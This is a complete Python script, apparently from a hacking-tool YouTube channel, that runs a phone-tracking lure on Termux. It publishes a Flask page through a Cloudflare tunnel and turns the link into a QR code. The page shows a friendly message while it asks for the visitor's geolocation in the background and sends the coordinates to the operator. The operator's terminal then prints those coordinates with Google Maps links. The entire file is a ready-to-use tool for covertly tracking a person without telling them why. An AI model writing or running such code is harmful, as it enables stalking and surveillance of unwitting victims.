# HCO Track Phone by Azhar - CLOUDFLARE EDITION
# Save as HCO_Track_Phone.py and run: python3 HCO_Track_Phone.py

import os, sys, threading, time, re, subprocess
from pathlib import Path
import requests
from flask import Flask, request

# Colors
RED = "\033[1;91m"; GREEN = "\033[1;92m"; CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"; RESET = "\033[0m"

locations = {}
app = Flask(__name__)

# ========================= TOOL LOCK =========================
def tool_lock():
    os.system('clear')
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HCO TRACK PHONE BY AZHAR'.center(60)}║{RESET}")
    print(f"{RED}║{'Subscribe @hackers_colony_tech'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}\n")
    print(f"{GREEN}👉 Subscribe to Hackers Colony Tech!{RESET}")
    print(f"{YELLOW}🔔 Don’t forget to click the bell icon!{RESET}\n")
    for i in range(9, 0, -1):
        sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1')
    print(f"\n{GREEN}✅ Redirected to YouTube!{RESET}\n")
    input(f"{YELLOW}Press ENTER after subscribing to continue...{RESET}")

# ========================= DEPENDENCIES =========================
def install_requirements():
    os.system('pkg update -y > /dev/null 2>&1 || true')
    os.system('pkg install python wget -y > /dev/null 2>&1 || true')
    os.system('pip install flask requests qrcode[pil] > /dev/null 2>&1 || true')

# ========================= CLOUDFLARE URL =========================
def start_cloudflared_tunnel(port=8080, timeout=10):
    try:
        proc = subprocess.Popen(
            ["cloudflared", "http", str(port)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
    except FileNotFoundError:
        return None, None
    url, start, pattern = None, time.time(), re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com")
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line: continue
        m = pattern.search(line)
        if m: url = m.group(0); break
    if url:
        threading.Thread(target=lambda: proc.wait(), daemon=True).start()
        return url, proc
    proc.kill(); return None, None

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=6).text.strip()
    except: return None

def create_public_url(port=8080):
    url, _ = start_cloudflared_tunnel(port)
    if url: return url
    ip = get_public_ip()
    return f"http://{ip}:{port}" if ip else f"http://localhost:{port}"

# ========================= FLASK =========================
@app.route('/')
def home():
    return '''
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
      body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial;font-size:22px;text-align:center;}
    </style>
    </head><body>
    <div>You are a great person 😁</div>
    <script>
    function sendLocation(){
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(pos=>{
          fetch('/update',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})});
        });
      }
    }
    window.onload=sendLocation;
    </script>
    </body></html>
    '''

@app.route('/update', methods=['POST'])
def update():
    data = request.get_json()
    if data and 'lat' in data and 'lon' in data:
        locations.clear(); locations.update(data); locations['time']=time.time()
        print(f"{GREEN}📍 Location: {data['lat']}, {data['lon']} (±{data.get('accuracy','?')}m){RESET}")
        return "OK"
    return "ERROR"

# ========================= QR =========================
def make_qr(url):
    try:
        import qrcode
        img = qrcode.make(url); out = Path("track_qr.png"); img.save(out)
        os.system(f"termux-open {out} 2>/dev/null || xdg-open {out} 2>/dev/null || true")
    except: pass

# ========================= MAIN =========================
def start_server(port=8080):
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False,use_reloader=False),daemon=True).start()

def main():
    tool_lock(); install_requirements()
    os.system('clear'); print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
    port=8080; PUBLIC_URL=create_public_url(port)
    start_server(port); time.sleep(2); make_qr(PUBLIC_URL)
    print(f"\n{RED}{'═'*60}{RESET}")
    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{RED}{'═'*60}{RESET}")
    print(f"{GREEN}🌍 Public Tracking URL:{RESET} {CYAN}{PUBLIC_URL}{RESET}")
    print(f"{YELLOW}⏳ Waiting for live location... (Ctrl+C to stop){RESET}")
    last_time=0
    while True:
        if 'time' in locations and locations['time']>last_time:
            last_time=locations['time']
            print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED!{RESET}")
            print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
            print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
            print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
        time.sleep(2)

if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{RED}🛑 Stopped{RESET}")
